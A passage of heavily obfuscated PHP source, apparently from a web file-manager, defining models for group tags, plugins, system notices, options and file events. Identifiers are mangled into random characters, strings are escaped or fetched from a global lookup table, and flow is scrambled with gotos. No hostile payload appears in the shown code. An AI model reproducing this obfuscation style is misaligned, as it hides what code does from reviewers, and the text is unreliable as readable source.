˚—§∞·[$©ï≥Ω§], $ ˚—§∞·[$ò»ƒ˚â], !0); $this->where(array($èê≈ÕËú[192] => $©ï≥Ω§))->save(array($èê≈ÕËú[192] => $ò»ƒ˚â)); $this->_clearChildrenCache($ ˚—§∞·[$ò»ƒ˚â]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($Æõï‡—Å) { $ ™„¯≥Ê =& $_SERVER[ß⁄ˆÇ†Œ]; return array($ ™„¯≥Ê[2076] => array($Æõï‡—Å[0], $ ™„¯≥Ê[2077]), $ ™„¯≥Ê[2078] => array($Æõï‡—Å[0], $ ™„¯≥Ê[2079])); } protected function get($¨€≤ﬂÈ¡) { $£∆ã¯æ’ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÇøîÜ·— = Model($£∆ã¯æ’[593])->metaGet($¨€≤ﬂÈ¡, $£∆ã¯æ’[2080]); $ãòéÖ∏â = json_decode($ÇøîÜ·—, !0); return $ãòéÖ∏â ? $ãòéÖ∏â : array($£∆ã¯æ’[2081] => $£∆ã¯æ’[91], $£∆ã¯æ’[454] => array()); } protected function set($ûÜ±í∂˘, $±ÀΩ£¢„) { $Üë≈ﬁø¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $±ÀΩ£¢„ = $±ÀΩ£¢„ ? $±ÀΩ£¢„ : array($Üë≈ﬁø¥[2081] => $Üë≈ﬁø¥[91], $Üë≈ﬁø¥[454] => array()); return Model($Üë≈ﬁø¥[593])->metaSet($ûÜ±í∂˘, $Üë≈ﬁø¥[2080], json_encode($±ÀΩ£¢„)); } protected function getByTagID($Óä√¬Òå, $ﬂ∆È¿˜Ÿ) { $áŸ»ûÖÃ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Óä√¬Òå || !$ﬂ∆È¿˜Ÿ) { return !1; } if (!Model($áŸ»ûÖÃ[593])->getInfoSimple($Óä√¬Òå)) { return !1; } $¶±‡ßò¬ = $this->get($Óä√¬Òå); if (!$¶±‡ßò¬ || !isset($¶±‡ßò¬[$áŸ»ûÖÃ[454]])) { return !1; } $˘—…¬”ÿ = array_find_by_field($¶±‡ßò¬[$áŸ»ûÖÃ[454]], $áŸ»ûÖÃ[483], $ﬂ∆È¿˜Ÿ); return is_array($˘—…¬”ÿ) ? $˘—…¬”ÿ : !1; } public function listSource($ ’Éπ©, $ÜÉÕ·Ω¨) { $˛ç∫À‡≥ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÜÉÕ·Ω¨ && !is_array($ÜÉÕ·Ω¨)) { $ÜÉÕ·Ω¨ = array($ÜÉÕ·Ω¨); } $ÔìÌäÁ… = $this->listData($ ’Éπ©); $‚ÿ≈±ë‹ = array(); foreach ($ÔìÌäÁ… as $§‡èà°©) { $Öé£ú¸ô = $§‡èà°©[$˛ç∫À‡≥[87]]; if (!$Öé£ú¸ô) { continue; } if (!isset($‚ÿ≈±ë‹[$Öé£ú¸ô])) { $‚ÿ≈±ë‹[$Öé£ú¸ô] = array(); } $‚ÿ≈±ë‹[$Öé£ú¸ô][] = $§‡èà°©[$˛ç∫À‡≥[508]]; } $◊ß¢Å¥† = array(); foreach ($‚ÿ≈±ë‹ as $Û´¶Éçß => $Í≤ã‡Ú’) { $≠Ç©åÆô = !0; if (!$ÜÉÕ·Ω¨) { $◊ß¢Å¥†[] = $Û´¶Éçß; continue; } foreach ($ÜÉÕ·Ω¨ as $¯ø∞éì•) { if (!in_array($¯ø∞éì•, $Í≤ã‡Ú’)) { $≠Ç©åÆô = !1; break; } } if ($≠Ç©åÆô) { $◊ß¢Å¥†[] = $Û´¶Éçß; } } if (!$◊ß¢Å¥†) { return array(); } $ü¸ñ≤Ã‡ = array($˛ç∫À‡≥[499] => array($˛ç∫À‡≥[500], $◊ß¢Å¥†), $˛ç∫À‡≥[577] => $ ’Éπ©, $˛ç∫À‡≥[190] => SourceModel::TYPE_GROUP); $ñÎµ–Ø∂ = Model($˛ç∫À‡≥[1414])->listSource($ü¸ñ≤Ã‡); if (!$ñÎµ–Ø∂ || count($◊ß¢Å¥†) == $ñÎµ–Ø∂[$˛ç∫À‡≥[451]][$˛ç∫À‡≥[452]]) { return $ñÎµ–Ø∂; } $Õ“⁄¡œó = array(); $Úÿ◊´πù = array_to_keyvalue($ñÎµ–Ø∂[$˛ç∫À‡≥[85]], $˛ç∫À‡≥[12], $˛ç∫À‡≥[193]); $Ä¯—çìÎ = array_to_keyvalue($ñÎµ–Ø∂[$˛ç∫À‡≥[86]], $˛ç∫À‡≥[12], $˛ç∫À‡≥[193]); $ù„©”Ï‡ = array_merge($Ä¯—çìÎ, $Úÿ◊´πù); foreach ($◊ß¢Å¥† as $Öé£ú¸ô) { if (!in_array($Öé£ú¸ô, $ù„©”Ï‡)) { $Õ“⁄¡œó[] = $Öé£ú¸ô; } } if ($Õ“⁄¡œó) { $this->removeBySource($ ’Éπ©, $Õ“⁄¡œó); } return $ñÎµ–Ø∂; } protected function listData($√ûΩπƒı) { $˙—·≥Úõ =& $_SERVER[ß⁄ˆÇ†Œ]; $ù·Ø¨û∫ = array($˙—·≥Úõ[1755] => 0, $˙—·≥Úõ[565] => array($˙—·≥Úõ[2082], 0), $˙—·≥Úõ[504] => $˙—·≥Úõ[2083] . $√ûΩπƒı); $Ñ˝îøåõ = $˙—·≥Úõ[2084]; $∫ßÁú¡§ = $this->field($Ñ˝îøåõ)->where($ù·Ø¨û∫)->order($˙—·≥Úõ[2085])->select(); return $∫ßÁú¡§ ? $∫ßÁú¡§ : array(); } protected function addToTag($ØÕÇΩ, $ÖÅ›ÁÌÿ, $‘æπ”ä–) { $ïïá·Û‡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->getByTagID($ØÕÇΩ, $‘æπ”ä–) || !$ÖÅ›ÁÌÿ) { return !1; } if (!Model($ïïá·Û‡[897])->pathInfo($ÖÅ›ÁÌÿ)) { return !1; } $∏û‡Øõ¿ = array($ïïá·Û‡[1755] => 0, $ïïá·Û‡[565] => $‘æπ”ä–, $ïïá·Û‡[503] => $ÖÅ›ÁÌÿ, $ïïá·Û‡[504] => $ïïá·Û‡[2086] . $ØÕÇΩ, $ïïá·Û‡[502] => $ïïá·Û‡[12], $ïïá·Û‡[1967] => 0); if ($this->where($∏û‡Øõ¿)->find()) { return !1; } return $this->add($∏û‡Øõ¿); } protected function removeFromTag($ÌŒß £î, $éÔ¢©ﬁ≠, $∫∂’ø“ö) { $÷˙∆ÁÀ® =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->getByTagID($ÌŒß £î, $∫∂’ø“ö) || !$éÔ¢©ﬁ≠) { return !1; } if (is_array($éÔ¢©ﬁ≠)) { $éÔ¢©ﬁ≠ = array($÷˙∆ÁÀ®[7], $éÔ¢©ﬁ≠); } $Ω¿ûπíù = array($÷˙∆ÁÀ®[1755] => 0, $÷˙∆ÁÀ®[565] => $∫∂’ø“ö, $÷˙∆ÁÀ®[504] => $÷˙∆ÁÀ®[2086] . $ÌŒß £î, $÷˙∆ÁÀ®[503] => $éÔ¢©ﬁ≠); return $this->where($Ω¿ûπíù)->delete(); } protected function removeByTag($ªÆÄ∂Ü‹, $È»˜æ¿é) { $¢â…Ñâ≈ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->getByTagID($ªÆÄ∂Ü‹, $È»˜æ¿é)) { return !1; } $î€öËÁ’ = array($¢â…Ñâ≈[1755] => 0, $¢â…Ñâ≈[565] => $È»˜æ¿é, $¢â…Ñâ≈[504] => $¢â…Ñâ≈[2086] . $ªÆÄ∂Ü‹); return $this->where($î€öËÁ’)->delete(); } protected function removeBySource($öå»ﬂ≥¡, $ã‡…ëì÷) { $àùêïÕı =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$öå»ﬂ≥¡ || !$ã‡…ëì÷) { return !1; } if (is_array($ã‡…ëì÷)) { $ã‡…ëì÷ = array($àùêïÕı[7], $ã‡…ëì÷); } $Ö·¡ô˛Ω = array($àùêïÕı[1755] => 0, $àùêïÕı[503] => $ã‡…ëì÷, $àùêïÕı[565] => array($àùêïÕı[1088], 0), $àùêïÕı[504] => $àùêïÕı[2086] . $öå»ﬂ≥¡); return $this->where($Ö·¡ô˛Ω)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x70\x6c\165\x67\151\x6e\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\x73\164\x61\x74\x75\163", "\x72\x65\x67\x69\145\x73\x74", "\143\157\x6e\146\151\x67"); public function loadList($π⁄≈‰Œ⁄ = false) { $ˆØ∂É¢œ = array_to_keyvalue($this->listData(), $_SERVER[ß⁄ˆÇ†Œ][32]); if ($π⁄≈‰Œ⁄) { return $ˆØ∂É¢œ[$π⁄≈‰Œ⁄]; } return $ˆØ∂É¢œ; } public function init() { $ìáÜæçé =& $_SERVER[ß⁄ˆÇ†Œ]; Hook::trigger($ìáÜæçé[2087]); $à·ò√»… = $this->loadPluginList(); foreach ($à·ò√»… as $«óêÒ≠ƒ => $Ö˚„íÚó) { $Œüïí¸◊ = $this->appAllow($«óêÒ≠ƒ, $Ö˚„íÚó); if (!$Œüïí¸◊) { continue; } foreach ($Ö˚„íÚó[$ìáÜæçé[2088]] as $œ˘¸ÌÜÒ => $öüıÿ˜) { Hook::bind($œ˘¸ÌÜÒ, $öüıÿ˜); } } Hook::trigger($ìáÜæçé[2089]); Hook::trigger(ACTION); } public function appAllow($»‘≠Ç˙ò, $‚π√±å’, $Á¡™“≥≠ = true) { $ˆøÒ∫ˆ =& $_SERVER[ß⁄ˆÇ†Œ]; $•–êßæÀ = PLUGIN_DIR . $»‘≠Ç˙ò . $ˆøÒ∫ˆ[2090]; if (!is_array($‚π√±å’) || !is_array($‚π√±å’[$ˆøÒ∫ˆ[2088]]) || $‚π√±å’[$ˆøÒ∫ˆ[823]] != 1 || !is_file($•–êßæÀ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ˆøÒ∫ˆ[6]][$ˆøÒ∫ˆ[2091]] || !$GLOBALS[$ˆøÒ∫ˆ[6]][$ˆøÒ∫ˆ[2092]]) { return !0; } $™Ï«˜ÅÏ = explode($ˆøÒ∫ˆ[50], strtolower($GLOBALS[$ˆøÒ∫ˆ[6]][$ˆøÒ∫ˆ[2092]])); return in_array(strtolower($»‘≠Ç˙ò), $™Ï«˜ÅÏ) ? !1 : !0; } if ($Á¡™“≥≠ && !Action($ˆøÒ∫ˆ[2093])->checkAuth($»‘≠Ç˙ò)) { return !1; } return !0; } public function unInstall($à¸âë÷ì) { $™Œ±˛ŸÖ =& $_SERVER[ß⁄ˆÇ†Œ]; $§ÿ°´Õä = $this->loadList($à¸âë÷ì); if (file_exists(PLUGIN_DIR . $à¸âë÷ì)) { Hook::apply($à¸âë÷ì . $™Œ±˛ŸÖ[2094]); } $this->remove($§ÿ°´Õä[$™Œ±˛ŸÖ[483]]); } public function changeStatus($Û›£¡É¯, $äŸ†˘âÜ) { $ÕÀàÎéò =& $_SERVER[ß⁄ˆÇ†Œ]; $É¨Ëòõ = $this->loadList($Û›£¡É¯); if ($äŸ†˘âÜ) { Hook::apply($Û›£¡É¯ . $ÕÀàÎéò[2095]); } $this->update($É¨Ëòõ[$ÕÀàÎéò[483]], array($ÕÀàÎéò[2096] => $äŸ†˘âÜ)); } public function appRegist($«ÿ∆ﬁæÂ, $ÃﬂÃı Œ) { $—“âƒ˚å =& $_SERVER[ß⁄ˆÇ†Œ]; $ª‡óœúâ = $this->loadList($«ÿ∆ﬁæÂ); if ($ª‡óœúâ) { $this->update($ª‡óœúâ[$—“âƒ˚å[483]], array($—“âƒ˚å[2088] => $ÃﬂÃı Œ)); } else { $¡º◊ø´ô = array($—“âƒ˚å[32] => $«ÿ∆ﬁæÂ, $—“âƒ˚å[2088] => $ÃﬂÃı Œ, $—“âƒ˚å[823] => 0, $—“âƒ˚å[6] => $this->getConfigDefault($«ÿ∆ﬁæÂ)); $this->insert($¡º◊ø´ô); } } public function getConfigDefault($•Å∏ûê˙) { $ì”˜Û‚∫ =& $_SERVER[ß⁄ˆÇ†Œ]; $ä–úÉËÿ = array(); $‚“≥ê£å = $this->getPackageJson($•Å∏ûê˙); if (!$‚“≥ê£å && is_array($‚“≥ê£å[$ì”˜Û‚∫[2097]])) { return $ä–úÉËÿ; } foreach ($‚“≥ê£å[$ì”˜Û‚∫[2097]] as $º—◊›˙• => $„◊π‰˘ˆ) { if (!isset($„◊π‰˘ˆ[$ì”˜Û‚∫[459]]) || isset($ä–úÉËÿ[$º—◊›˙•])) { continue; } $ä–úÉËÿ[$º—◊›˙•] = $„◊π‰˘ˆ[$ì”˜Û‚∫[459]]; } return $ä–úÉËÿ; } public function getPackageJson($îÿõ¢õ¯) { return Hook::apply($îÿõ¢õ¯ . $_SERVER[ß⁄ˆÇ†Œ][2098]); } public function getConfig($™ºË◊¶ç, $ÚÇü±œ¸ = false) { $Òõ¡¸òΩ =& $_SERVER[ß⁄ˆÇ†Œ]; $¶É…‰»‹ = array(); $ÕÓ∏®“Ó = $this->loadList($™ºË◊¶ç); if ($ÕÓ∏®“Ó && is_array($ÕÓ∏®“Ó[$Òõ¡¸òΩ[6]])) { $¶É…‰»‹ = $ÕÓ∏®“Ó[$Òõ¡¸òΩ[6]]; } if (!$¶É…‰»‹ || $ÚÇü±œ¸) { $¶É…‰»‹ = $this->getConfigDefault($™ºË◊¶ç); } return $¶É…‰»‹; } public function setConfig($üûíÀÅí, $‰†ó√≤€ = false) { $Ü⁄’∂˜ú =& $_SERVER[ß⁄ˆÇ†Œ]; $Î¶≈ÛÌõ = $this->loadList($üûíÀÅí); if (!$Î¶≈ÛÌõ) { return !1; } $–›ìº¥Œ = $Î¶≈ÛÌõ[$Ü⁄’∂˜ú[6]]; if ($‰†ó√≤€ == !1) { $–›ìº¥Œ = array(); $‰†ó√≤€ = $this->getConfigDefault($üûíÀÅí); } foreach ($‰†ó√≤€ as $ŒÊ˜≥ì† => $¨ﬂ·†„÷) { $–›ìº¥Œ[$ŒÊ˜≥ì†] = is_string($¨ﬂ·†„÷) ? trim($¨ﬂ·†„÷) : $¨ﬂ·†„÷; } $this->update($Î¶≈ÛÌõ[$Ü⁄’∂˜ú[483]], array($Ü⁄’∂˜ú[6] => $–›ìº¥Œ)); } public function viewList() { $÷£±±ïœ =& $_SERVER[ß⁄ˆÇ†Œ]; $ö¸ñ˜Àõ = $this->loadList(); $this->pluginScan($ö¸ñ˜Àõ); $ö¸ñ˜Àõ = $this->loadPluginList(); $í‚†Å˜Ö = array(); foreach ($ö¸ñ˜Àõ as $≥ã∫à¯Ü => $˝∂ÇäÆÕ) { $†∏ÉéÜ¨ = $˝∂ÇäÆÕ; unset($˝∂ÇäÆÕ[$÷£±±ïœ[2088]], $˝∂ÇäÆÕ[$÷£±±ïœ[6]]); $ﬂ˝çÀœ‘ = PLUGIN_DIR . $˝∂ÇäÆÕ[$÷£±±ïœ[32]] . $÷£±±ïœ[2090]; if (!is_file($ﬂ˝çÀœ‘)) { continue; } $πËª≈çó = Hook::apply($˝∂ÇäÆÕ[$÷£±±ïœ[32]] . $÷£±±ïœ[2098]); if (!is_array($πËª≈çó)) { continue; } $í‚†Å˜Ö[$≥ã∫à¯Ü] = array_merge($˝∂ÇäÆÕ, $πËª≈çó); if ($†∏ÉéÜ¨[$÷£±±ïœ[6]][$÷£±±ïœ[1678]] != $πËª≈çó[$÷£±±ïœ[1652]]) { Hook::apply($˝∂ÇäÆÕ[$÷£±±ïœ[32]] . $÷£±±ïœ[2095]); $†∏ÉéÜ¨[$÷£±±ïœ[6]][$÷£±±ïœ[1678]] = $πËª≈çó[$÷£±±ïœ[1652]]; $this->update($˝∂ÇäÆÕ[$÷£±±ïœ[483]], array($÷£±±ïœ[6] => $†∏ÉéÜ¨[$÷£±±ïœ[6]])); } } return $í‚†Å˜Ö; } private function loadPluginList() { $î‡ﬁ‰Õ˛ =& $_SERVER[ß⁄ˆÇ†Œ]; $€íπ‚ΩÕ = $this->loadList(); if (strtolower(MOD) == $î‡ﬁ‰Õ˛[2099]) { return $€íπ‚ΩÕ; } $Øê”Ûò≠ = Hook::trigger($î‡ﬁ‰Õ˛[2100], $€íπ‚ΩÕ); if ($€íπ‚ΩÕ && !$Øê”Ûò≠) { die; } return $Øê”Ûò≠ ? $Øê”Ûò≠ : $€íπ‚ΩÕ; } private function pluginScan($å…¯ª‹) { $ΩûÉÅ™ï =& $_SERVER[ß⁄ˆÇ†Œ]; recursion_dir(PLUGIN_DIR, $ìﬂÔã¸æ, $ÑΩ–ò∂˜, 0); foreach ($ìﬂÔã¸æ as $”π®Üâ¯) { $¯”¨ß˚ç = get_path_this($”π®Üâ¯); if (isset($å…¯ª‹[$¯”¨ß˚ç]) || !file_exists($”π®Üâ¯ . $ΩûÉÅ™ï[2101]) || !file_exists($”π®Üâ¯ . $ΩûÉÅ™ï[2090])) { continue; } Hook::apply($¯”¨ß˚ç . $ΩûÉÅ™ï[2095]); } } } goto d‹ç¡õÖôë; a£Ñ∑ó‡á’: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\156\x6f\x74\151\x63\x65\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\143\157\156\x74\x65\x6e\164", "\141\x75\164\x68", "\x6d\157\144\x65", "\x74\151\x6d\x65", "\x74\171\x70\145", "\x6c\145\x76\x65\154", "\145\x6e\141\x62\x6c\x65", "\x73\x6f\162\164"); public function listData($Œ◊îÌñß = false, $é‰™à®ç = "\163\x6f\x72\164", $Àä∑£¢” = false) { return parent::listData($Œ◊îÌñß, $é‰™à®ç, $Àä∑£¢”); } public function add($∞âß÷Û¿) { $ÿ…ó⁄˛ñ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÍÄ»˜¨Ÿ = time(); if ($∞âß÷Û¿[$ÿ…ó⁄˛ñ[16]] == $ÿ…ó⁄˛ñ[2426]) { $ÍÄ»˜¨Ÿ = strtotime($∞âß÷Û¿[$ÿ…ó⁄˛ñ[206]]); } $∞âß÷Û¿[$ÿ…ó⁄˛ñ[206]] = $ÍÄ»˜¨Ÿ; return parent::insert($∞âß÷Û¿); } public function update($èÈ¨√Äë, $â•ó’âá) { $¡›ëî§æ =& $_SERVER[ß⁄ˆÇ†Œ]; $é©‡ÿ‹≤ = $this->listData($èÈ¨√Äë); if (!$é©‡ÿ‹≤) { return !1; } $ÜëõÀÇ≈ = time(); if ($â•ó’âá[$¡›ëî§æ[16]] == $¡›ëî§æ[2426]) { $ÜëõÀÇ≈ = strtotime($â•ó’âá[$¡›ëî§æ[206]]); } $â•ó’âá[$¡›ëî§æ[206]] = $ÜëõÀÇ≈; return parent::update($èÈ¨√Äë, $â•ó’âá); } public function remove($˜´¯”ÄÍ) { $ôöä¢ = $this->listData($˜´¯”ÄÍ); if (!$ôöä¢ || $ôöä¢[$_SERVER[ß⁄ˆÇ†Œ][191]]) { return !1; } return parent::remove($˜´¯”ÄÍ); } public function sort($Ô‡¬ÁÎÅ, $œ‡µò) { return parent::update($Ô‡¬ÁÎÅ, $œ‡µò); } public function enable($øÔÖ¯ëØ, $öÑ˘≈Èô) { return parent::update($øÔÖ¯ëØ, array($_SERVER[ß⁄ˆÇ†Œ][2427] => $öÑ˘≈Èô)); } private function initUserOption() { $ÆÄ∞‰’Ü =& $_SERVER[ß⁄ˆÇ†Œ]; $this->optionType = $ÆÄ∞‰’Ü[2428]; $this->modelType = $ÆÄ∞‰’Ü[2429]; $this->field = array($ÆÄ∞‰’Ü[2430], $ÆÄ∞‰’Ü[32], $ÆÄ∞‰’Ü[206], $ÆÄ∞‰’Ü[33], $ÆÄ∞‰’Ü[2431], $ÆÄ∞‰’Ü[823], $ÆÄ∞‰’Ü[226]); } public function userNoticeGet($≈†É≥Îî = false) { $this->initUserOption(); return parent::listData($≈†É≥Îî, $_SERVER[ß⁄ˆÇ†Œ][483], !0); } public function userNoticeAdd($§⁄≤ì∞Û) { $ëù…îî =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initUserOption(); $Î˝Ú˚£˙ = $this->findByKey($ëù…îî[2430], $§⁄≤ì∞Û[$ëù…îî[483]]); if ($Î˝Ú˚£˙) { return !0; } $∆©¢√ß„ = array($ëù…îî[2430] => $§⁄≤ì∞Û[$ëù…îî[483]], $ëù…îî[32] => $§⁄≤ì∞Û[$ëù…îî[32]], $ëù…îî[206] => $§⁄≤ì∞Û[$ëù…îî[206]], $ëù…îî[33] => isset($§⁄≤ì∞Û[$ëù…îî[33]]) ? $§⁄≤ì∞Û[$ëù…îî[33]] : 1, $ëù…îî[2431] => isset($§⁄≤ì∞Û[$ëù…îî[2431]]) ? $§⁄≤ì∞Û[$ëù…îî[2431]] : 0, $ëù…îî[823] => 0, $ëù…îî[226] => 0); return parent::insert($∆©¢√ß„); } public function userNoticeEdit($áÖ¯Êö·, $¨ÑÍœÏì) { $this->initUserOption(); return parent::update($áÖ¯Êö·, $¨ÑÍœÏì); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\155\137\x6f\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\154\x65", "\x72\x6f\154\x65\107\162\x6f\165\x70", "\162\145\x67\151\163\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ö§ﬁ∫©) { return "\123\x79\163\164\145\x6d\117\160\x74\x69\x6f\x6e\x5f{$ö§ﬁ∫©}"; } protected function optionDefault($†Ü’´”£ = '') { $¯à˜≥ëé =& $_SERVER[ß⁄ˆÇ†Œ]; if ($†Ü’´”£ == $¯à˜≥ëé[12]) { return $GLOBALS[$¯à˜≥ëé[6]][$¯à˜≥ëé[465]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Bç¿ÃıÎ‚; e™Ó¡ïúõÑ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\145\137\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\156"), array("\144\x65\x73\143", '', "\151\x6e\163\x65\162\164\54\165\x70\144\x61\164\145\x2c\x73\145\x6c\145\x63\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ω¯ìÀÿÑ, $ïÍØÕœ›, $ÖÚ§íÄ» = '') { $µüû˙¥√ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->eventSave) { return; } $≈ûò£“é = Model($µüû˙¥√[1414])->sourceInfo($Ω¯ìÀÿÑ); if (!$≈ûò£“é) { return !1; } if ($this->isDisableEvent($≈ûò£“é, $ïÍØÕœ›)) { return; } if ($ÖÚ§íÄ» && is_string($ÖÚ§íÄ»)) { $ÖÚ§íÄ» = array($µüû˙¥√[2002] => $ÖÚ§íÄ»); } $£∂Øœ„ﬁ = defined($µüû˙¥√[2189]) ? USER_ID : 0; $≠·µ’Á´ = array($µüû˙¥√[499] => $Ω¯ìÀÿÑ, $µüû˙¥√[2190] => $≈ûò£“é[$µüû˙¥√[192]], $µüû˙¥√[2191] => $≈ûò£“é[$µüû˙¥√[32]], $µüû˙¥√[590] => !empty($≈ûò£“é[$µüû˙¥√[590]]) ? $≈ûò£“é[$µüû˙¥√[590]] : $µüû˙¥√[12], $µüû˙¥√[1755] => $£∂Øœ„ﬁ, $µüû˙¥√[504] => $ïÍØÕœ›, $µüû˙¥√[1757] => $ÖÚ§íÄ»); $this->addSystemLog($ïÍØÕœ›, $≠·µ’Á´); unset($≠·µ’Á´[$µüû˙¥√[2191]], $≠·µ’Á´[$µüû˙¥√[590]]); return $this->add($≠·µ’Á´); } private function addSystemLog($¿íüÏüµ, $ÖÂ√Œæ–) { $£–„π»◊ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($¿íüÏüµ == $£–„π»◊[2192]) { $¿íüÏüµ = $ÖÂ√Œæ–[$£–„π»◊[534]][$£–„π»◊[2193]]; } else { if (in_array($¿íüÏüµ, array($£–„π»◊[1942], $£–„π»◊[2194]))) { $¿íüÏüµ = $ÖÂ√Œæ–[$£–„π»◊[534]][$£–„π»◊[171]]; } } $Î ≥Ñ›ò = array_merge($ÖÂ√Œæ–, array($£–„π»◊[2195] => $ÖÂ√Œæ–[$£–„π»◊[193]], $£–„π»◊[2196] => $ÖÂ√Œæ–[$£–„π»◊[2196]])); Hook::trigger($£–„π»◊[2197], $£–„π»◊[2198] . $¿íüÏüµ, $ÖÂ√Œæ–); Model($£–„π»◊[1906])->addLog($£–„π»◊[2198] . $¿íüÏüµ, $Î ≥Ñ›ò); } private function isDisableEvent($Á◊Ìï°Ì, $Ÿ‚§Ó∫ﬂ) { $¥ﬂ–˛€¯ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($Á◊Ìï°Ì[$¥ﬂ–˛€¯[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ÿ‚§Ó∫ﬂ == $¥ﬂ–˛€¯[1931]) { return !1; } return !0; } public function eventCreate($øê≥ñè∑, $”‚ÆòÖ™) { $¸ä”∑Ü∞ =& $_SERVER[ß⁄ˆÇ†Œ]; $úóø¨¨∫ = Model($¸ä”∑Ü∞[1414])->sourceInfo($øê≥ñè∑); $∫Ω–∏Éø = array($¸ä”∑Ü∞[2193] => $”‚ÆòÖ™, $¸ä”∑Ü∞[32] => $úóø¨¨∫[$¸ä”∑Ü∞[32]]); return $this->addEvent($øê≥ñè∑, $¸ä”∑Ü∞[2192], $∫Ω–∏Éø); } public function eventFileEdit($∞í®≥∏Õ) { $˝¥“êœ  =& $_SERVER[ß⁄ˆÇ†Œ]; $Ó∫√àıú = array($˝¥“êœ [2199] => $_SERVER[$˝¥“êœ [2200]], $˝¥“êœ [2201] => strtolower(ACTION)); if (isset($GLOBALS[$˝¥“êœ [7]][$˝¥“êœ [2202]])) { $Ó∫√àıú[$˝¥“êœ [2202]] = $˝¥“êœ [91]; } return $this->addEvent($∞í®≥∏Õ, $˝¥“êœ [1932], $Ó∫√àıú); } public function eventRecycle($·¬äÌ˜¬, $±˚Ú¯¡∞) { return $this->addEvent($·¬äÌ˜¬, $_SERVER[ß⁄ˆÇ†Œ][2194], $±˚Ú¯¡∞); } private static $_removeLast = ''; public function eventRemove($‘›˘ƒ…∏) { $·¿—›πÈ =& $_SERVER[ß⁄ˆÇ†Œ]; self::$_removeLast = $‘›˘ƒ…∏; $ˆ¯Ï∏≈¥ = Model($·¿—›πÈ[1414])->sourceInfo($‘›˘ƒ…∏); $ﬁÎéÑÅ = array_field_key($ˆ¯Ï∏≈¥, array($·¿—›πÈ[193], $·¿—›πÈ[549], $·¿—›πÈ[513], $·¿—›πÈ[592])); $ﬁºï®âÏ = array($·¿—›πÈ[171] => $ˆ¯Ï∏≈¥[$·¿—›πÈ[32]], $·¿—›πÈ[2201] => ACTION, $·¿—›πÈ[2203] => $ﬁÎéÑÅ); return $this->addEvent($ˆ¯Ï∏≈¥[$·¿—›πÈ[192]], $·¿—›πÈ[1931], $ﬁºï®âÏ); } public function eventShare($Ø…˙—Ú¿, $◊∞’ÀËê) { return $this->addEvent($Ø…˙—Ú¿, $_SERVER[ß⁄ˆÇ†Œ][1942], $◊∞’ÀËê); } public function eventMove($Ò®¨ù⁄•, $∫≥¬ÍÈ§, $çÛê≤◊Ó) { $ÁÀ‰ë∂  =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$_removeLast == $Ò®¨ù⁄•) { return; } $◊≥çôåÙ = Model($ÁÀ‰ë∂ [1414]); $…ïïøê∞ = $◊≥çôåÙ->sourceInfo($Ò®¨ù⁄•); $è‹•ıÕ– = $◊≥çôåÙ->sourceInfo($∫≥¬ÍÈ§); $∞„ﬂ§°— = $◊≥çôåÙ->sourceInfo($çÛê≤◊Ó); $§˙¥¡ƒû = array($ÁÀ‰ë∂ [1237] => $∫≥¬ÍÈ§, $ÁÀ‰ë∂ [2204] => $è‹•ıÕ–[$ÁÀ‰ë∂ [32]], $ÁÀ‰ë∂ [2180] => !empty($è‹•ıÕ–[$ÁÀ‰ë∂ [590]]) ? $è‹•ıÕ–[$ÁÀ‰ë∂ [590]] : $ÁÀ‰ë∂ [12], $ÁÀ‰ë∂ [1238] => $çÛê≤◊Ó, $ÁÀ‰ë∂ [2205] => $∞„ﬂ§°—[$ÁÀ‰ë∂ [32]], $ÁÀ‰ë∂ [2206] => !empty($∞„ﬂ§°—[$ÁÀ‰ë∂ [590]]) ? $∞„ﬂ§°—[$ÁÀ‰ë∂ [590]] : $ÁÀ‰ë∂ [12]); $this->addEvent($Ò®¨ù⁄•, $ÁÀ‰ë∂ [628], $§˙¥¡ƒû); $…ïïøê∞ = $◊≥çôåÙ->sourceInfo($Ò®¨ù⁄•); $§˙¥¡ƒû = array($ÁÀ‰ë∂ [193] => $…ïïøê∞[$ÁÀ‰ë∂ [193]], $ÁÀ‰ë∂ [32] => $…ïïøê∞[$ÁÀ‰ë∂ [32]]); $this->addEvent($∫≥¬ÍÈ§, $ÁÀ‰ë∂ [2207], $§˙¥¡ƒû); } public function eventCopy($˝Ìﬁ¶ñ¨) { $this->eventCreate($˝Ìﬁ¶ñ¨, $_SERVER[ß⁄ˆÇ†Œ][626]); } public function eventRename($∑«¢èº∞, $¯Ô˙ÿ¥î, $ºÒÊ…çÂ) { $ÍÑÛ≤ÒÖ =& $_SERVER[ß⁄ˆÇ†Œ]; $©£ì∏ÁÈ = array($ÍÑÛ≤ÒÖ[1237] => 